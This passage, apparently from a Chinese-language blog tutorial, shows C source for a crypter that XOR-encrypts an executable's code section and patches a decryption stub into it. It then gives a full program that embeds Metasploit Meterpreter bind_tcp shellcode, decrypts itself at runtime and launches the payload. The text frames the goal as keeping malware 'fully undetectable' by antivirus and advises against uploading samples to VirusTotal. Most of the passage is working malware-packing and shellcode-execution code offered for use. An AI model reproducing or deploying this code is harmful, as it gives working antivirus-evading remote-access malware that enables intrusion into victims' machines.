<span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">buffer[i]=buffer[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Replace current .code section in file by encrypted one */</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fwrite(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipherBytes: Trouble writing nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Successfully ciphered %d bytes\n&quot;</span>,nbytes);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁-stub部分"><a href="#补丁-stub部分" class="headerlink" title="补丁.stub部分"></a>补丁.stub部分</h3><p>加密 .code 部分后，我们需要修补 .stub 部分，以便目标可以自行解密。在这个函数中，我们：</p><ul><li>打开二进制目标文件</li><li>寻找 .stub 段</li><li>在缓冲区中加载 .stub 段</li><li>找到 CODE_BASE_ADDRESS 和 CODE_SIZE</li><li>用虚拟内存偏移量和 .code 部分的大小替换值</li><li>写补丁缓冲区代替 .stub 段</li><li>关闭文件并离开</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Patch the filepath file (the .stub segment)</span></span><br><span class="line"><span class="comment"> * Here we replace CODE_BASE_ADDRESS and CODE_SIZE by newBaseAddr and newSegSize</span></span><br><span class="line"><span class="comment"> * newBaseAddr is the Virtual memory base address of .code segment in target file</span></span><br><span class="line"><span class="comment"> * newSegSize contains the size of the target file .code segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">patchStub</span><span class="params">(<span class="keyword">char</span> * filepath,  SEGMENT_INFO_PTR addrInfo, DWORD newBaseAddr, DWORD newSegSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD fileOffset;</span><br><span class="line">DWORD nbytes;</span><br><span class="line">DWORD nItems;</span><br><span class="line"><span class="comment">/* Signature to locate where segment memory base address should be written */</span></span><br><span class="line">BYTE baseAddrSignature[] = &#123; <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x15</span>, <span class="number">0x00</span> &#125;; </span><br><span class="line"><span class="comment">/* Signature to locate where segment size should be written*/</span></span><br><span class="line">BYTE segSizeSignature[] = &#123; <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x00</span> &#125;; </span><br><span class="line">BYTE * baseAddrAddress = <span class="literal">NULL</span>;</span><br><span class="line">BYTE * segSizeAddress = <span class="literal">NULL</span>;</span><br><span class="line">BYTE *buffer;</span><br><span class="line">FILE* fptr;</span><br><span class="line">fileOffset = addrInfo-&gt;fileSegmentOffset;</span><br><span class="line">nbytes = addrInfo-&gt;fileSegmentSize;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Allocate memory in buffer that will store content of segment */</span></span><br><span class="line">buffer = (BYTE*)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line"><span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: malloc error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Open binary file */</span></span><br><span class="line">    fptr = fopen(filepath, <span class="string">&quot;r+b&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: fopen error \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Seek .stub section using calculated offset*/</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, addrInfo-&gt;fileSegmentOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Unable to set file pointer to %ld \n&quot;</span>, addrInfo-&gt;fileSegmentOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Copy content of stub segment into buffer */</span></span><br><span class="line">nItems = fread(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Trouble reading nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Search the baseAddress in buffer section */</span></span><br><span class="line">baseAddrAddress = binStrstr(buffer,baseAddrSignature);</span><br><span class="line"><span class="comment">/* Change base Address by calculated value */</span></span><br><span class="line"><span class="built_in">memcpy</span>(baseAddrAddress,&amp;newBaseAddr,<span class="keyword">sizeof</span>(newBaseAddr));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Search the baseAddress in buffer section */</span></span><br><span class="line">segSizeAddress = binStrstr(buffer,segSizeSignature);</span><br><span class="line"><span class="comment">/* Change base Address by calculated value */</span></span><br><span class="line"><span class="built_in">memcpy</span>(segSizeAddress,&amp;newSegSize,<span class="keyword">sizeof</span>(newSegSize));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Replace current .stub section in file by patched one */</span></span><br><span class="line"><span class="keyword">if</span>(fseek(fptr, fileOffset, SEEK_SET)!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Unable to set file pointer to %ld \n&quot;</span>, fileOffset);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">nItems = fwrite(buffer, <span class="keyword">sizeof</span>(BYTE), nbytes, fptr);</span><br><span class="line"><span class="keyword">if</span>(nItems  &lt;nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;patchStub: Trouble writing nItems = %d \n&quot;</span>,nItems);</span><br><span class="line">fclose(fptr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Successfully patched file\n&quot;</span>);</span><br><span class="line">fclose(fptr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="main部分"><a href="#main部分" class="headerlink" title="main部分"></a>main部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * Cryptor entry point </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *fileName;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">HANDLE hFileMapping;</span><br><span class="line">LPVOID fileBaseAddress;</span><br><span class="line">BOOL retVal;</span><br><span class="line"><span class="comment">/* To store information of .code and .stub segments */</span></span><br><span class="line">SEGMENT_INFO codeSegmentInfo;</span><br><span class="line">SEGMENT_INFO stubSegmentInfo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(argc &lt;<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main: Not enough arguments&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fileName = argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* Map target file */</span></span><br><span class="line">retVal = getHMODULE(fileName, &amp;hFile, &amp;hFileMapping, &amp;fileBaseAddress);</span><br><span class="line"><span class="keyword">if</span>(retVal==FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Init structures */</span></span><br><span class="line">codeSegmentInfo.moduleBase = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.memorySegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.fileSegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">codeSegmentInfo.fileSegmentSize = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.moduleBase = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.memorySegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.fileSegmentOffset = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line">stubSegmentInfo.fileSegmentSize = (DWORD)<span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Fill segments information */</span></span><br><span class="line">getSegmentsInfo(fileBaseAddress,&amp;codeSegmentInfo,&amp;stubSegmentInfo);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n=======================\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.code segment information: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM image base=0x%08X\n&quot;</span>,codeSegmentInfo.moduleBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM segment offset=0x%08X\n&quot;</span>,codeSegmentInfo.memorySegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File offset of code =0x%08X\n&quot;</span>,codeSegmentInfo.fileSegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File size of code=0x%08X\n&quot;</span>,codeSegmentInfo.fileSegmentSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n=======================\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.stub segment information: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM image base=0x%08X\n&quot;</span>,stubSegmentInfo.moduleBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RAM segment offset=0x%08X\n&quot;</span>,stubSegmentInfo.memorySegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File offset of code =0x%08X\n&quot;</span>,stubSegmentInfo.fileSegmentOffset);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;File size of code=0x%08X\n&quot;</span>,stubSegmentInfo.fileSegmentSize);</span><br><span class="line">closeHandles(hFile, hFileMapping,fileBaseAddress);</span><br><span class="line">cipherBytes(fileName,&amp;codeSegmentInfo);</span><br><span class="line"> </span><br><span class="line">patchStub(fileName,&amp;stubSegmentInfo,codeSegmentInfo.moduleBase+codeSegmentInfo.memorySegmentOffset,codeSegmentInfo.fileSegmentSize);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h2><p>VirusTotal（<a href="https://www.77169.net/go?url=https://www.virustotal.com">https://www.virustotal.com</a>）是针对多个AV的在线扫描的参考平台。</p><blockquote><p>  众所周知，如果你想要一个未被检测到的恶意软件来保留FUD特性，你应该永远不会发送到VirusTotal</p></blockquote><p>FUD(Fully undetectable),完全不被检测</p><h2 id="加密的恶意软件"><a href="#加密的恶意软件" class="headerlink" title="加密的恶意软件"></a>加密的恶意软件</h2><p>这里的完整代码：<a href="https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable">https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Declare new sections to store encrypted code and shellcode data */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.code&quot;</span>,execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.codedata&quot;</span>, read, write)</span></span><br><span class="line"><span class="comment">// Merge  .codedata into .code (which will be encrypted by cryptor)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/MERGE:.codedata=.code&quot;</span>)</span></span><br><span class="line"><span class="comment">// Declare .code as Executable, Read, Write section, this is necessary so application rewrites itself</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:.code,ERW&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// This will put all following constants and global variables in .codedata segment</span></span><br><span class="line"><span class="comment">// 这会将所有以下常量和全局变量放在 .codedata 段中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.codedata&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> const_seg(<span class="meta-string">&quot;.codedata&quot;</span>)</span></span><br><span class="line"><span class="comment">// From here executable code will go in .code section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.code&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * windows/meterpreter/bind_tcp - 298 bytes (stage 1)</span></span><br><span class="line"><span class="comment"> * http://www.metasploit.com</span></span><br><span class="line"><span class="comment"> * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false, </span></span><br><span class="line"><span class="comment"> * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, </span></span><br><span class="line"><span class="comment"> * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, </span></span><br><span class="line"><span class="comment"> * EnableUnicodeEncoding=true</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xdb\x53\x68\x02\x00\x00\x50\x89\xe6\x6a\x10\x56\x57\x68\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Launch the meterpreter shellcode */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shellLaunch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="comment">/* Declare pointer on function */</span></span><br><span class="line">    <span class="keyword">int</span> (*func) ();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Cast shellcode into function */</span></span><br><span class="line">    func = (<span class="keyword">int</span> (*) ()) buf;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Call function (Execute shellcode) */</span></span><br><span class="line">    (<span class="keyword">int</span>) (*func) ();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// .stub SECTION , the following part is not encrypted.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stub&quot;</span>, execute, read, write)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.stubdata&quot;</span>, read, write)</span></span><br><span class="line"><span class="comment">// Merge  .stubdata into .stub (decryption part)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/MERGE:.stubdata=.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// This will put out strings and global variables in .stubdata segment</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;.stubdata&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> const_seg(<span class="meta-string">&quot;.stubdata&quot;</span>)</span></span><br><span class="line"><span class="comment">// Executable code will go in .stub section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.stub&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// Next data are signature recognized by cryptor to patch the target</span></span><br><span class="line"><span class="comment">// 下一个数据是加密器识别的签名以修补目标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_BASE_ADDRESS0x15151515 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE_SIZE0x14141414 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Decrypt .code block encrypted by cryptor */</span></span><br><span class="line"><span class="comment">/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */</span></span><br><span class="line"><span class="comment">/* Or disable security check (GS- option) on prog compilation */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decryptCodeSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> nbytes;</span><br><span class="line">DWORD patience;</span><br><span class="line">DWORD codeAddr;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> cpt = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">BYTE  key[] = &#123; <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> keyLength = <span class="number">8</span>;</span><br><span class="line">ptr = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)CODE_BASE_ADDRESS;</span><br><span class="line">nbytes = CODE_SIZE;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Decrypt code segment    </span></span><br><span class="line">        <span class="keyword">for</span>( i = <span class="number">0</span> ; i &lt; nbytes ; i++ )</span><br><span class="line">        &#123;</span><br><span class="line">ptr[i]=ptr[i]^key[cpt];</span><br><span class="line">cpt = cpt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cpt == keyLength)</span><br><span class="line">cpt = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">decryptCodeSection();</span><br><span class="line">shellLaunch(); <span class="comment">/* Call function which executes shellcode now that it is decrypted */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h1 id="复杂的方法"><a href="#复杂的方法" class="headerlink" title="复杂的方法"></a>复杂的方法</h1><h2 id="代码注入方法"><a href="#代码注入方法" class="headerlink" title="代码注入方法"></a>代码注入方法</h2><p>代码注入指在另一个进程内运行代码。这个一般通过DLL注入来实现，但也有其他可能存在的方法，甚至可能直接注入完整的exe： 